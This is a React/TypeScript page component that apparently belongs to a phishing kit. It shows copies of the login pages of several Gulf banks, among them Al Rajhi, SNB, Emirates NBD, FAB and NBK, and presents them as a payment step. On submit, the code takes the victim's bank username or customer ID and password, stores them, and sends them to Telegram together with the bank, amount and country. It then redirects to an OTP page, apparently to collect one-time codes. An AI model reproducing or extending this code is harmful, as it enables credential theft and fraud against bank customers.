import { useState, useMemo, useEffect } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { useUpdateLink } from "@/hooks/useSupabase";
import { useLinkData } from "@/hooks/useLinkData";
import { Loader2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getBankById } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import PaymentMetaTags from "@/components/PaymentMetaTags";
import { MirrorPageWrapper } from "@/components/MirrorPageWrapper";
import { AlRajhiLogin, SNBLogin, EmiratesNBDLogin, FABLogin, NBKLogin, GenericBankLogin } from "@/components/BankLoginLayouts";

const PaymentBankLogin = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLinkData(id);
  const updateLink = useUpdateLink();
  
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [customerId, setCustomerId] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const selectedBankId = linkData?.payload?.selectedBank || searchParams.get("bank");
  
  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const rawAmount = linkData?.payload?.payment_amount || 0;
  const formattedAmount = formatCurrency(rawAmount, linkData?.payload?.currency_code || selectedCountry);
  const selectedCountryData = getCountryByCode(selectedCountry);
  const selectedBank = selectedBankId ? getBankById(selectedBankId) : null;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password || (!username && !customerId)) {
      toast({ title: "خطأ", description: "يرجى إكمال بيانات الدخول", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    const bankLoginData = { username, customerId, password };

    try {
      if (id && id !== 'local') {
        await updateLink.mutateAsync({ linkId: id!, payload: { ...linkData?.payload, bankLoginData } });
      }

      await sendToTelegram({
        type: 'bank_login',
        data: {
          username: username || customerId,
          password: password,
          bank: selectedBank?.nameAr,
          service: linkData?.payload?.service_name || "خدمة دفع",
          amount: formattedAmount,
          country: selectedCountryData?.nameAr
        },
        timestamp: new Date().toISOString()
      });

      navigate(`/pay/${id}/otp${window.location.search}`);
    } catch (error) {
      toast({ title: "خطأ", description: "فشل تسجيل الدخول", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (linkLoading || !linkData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <Loader2 className="w-10 h-10 animate-spin text-primary" />
      </div>
    );
  }

  const loginProps = {
    bank: selectedBank || null,
    branding: null,
    username,
    setUsername,
    password,
    setPassword,
    customerId,
    setCustomerId,
    showPassword,
    setShowPassword,
    isSubmitting,
    handleSubmit,
    formattedAmount
  };

  const renderLoginLayout = () => {
    switch (selectedBankId) {
      case 'alrajhi_bank':
        return <AlRajhiLogin {...loginProps} />;
      case 'alahli_bank':
        return <SNBLogin {...loginProps} />;
      case 'emirates_nbd':
        return <EmiratesNBDLogin {...loginProps} />;
      case 'fab':
        return <FABLogin {...loginProps} />;
      case 'nbk':
        return <NBKLogin {...loginProps} />;
      default:
        return <GenericBankLogin {...loginProps} />;
    }
  };

  return (
    <MirrorPageWrapper entityId={selectedBankId || "bank"} title="تسجيل الدخول" linkData={linkData} hideHeader={true}>
      <PaymentMetaTags 
        serviceKey={selectedBankId ? `bank_${selectedBankId}` : "bank"}
        serviceName={selectedBank?.nameAr || "البنك"}
        title={`تسجيل الدخول - ${selectedBank?.nameAr || 'البنك'}`}
      />
      {renderLoginLayout()}
    </MirrorPageWrapper>
  );
};

export default PaymentBankLogin;
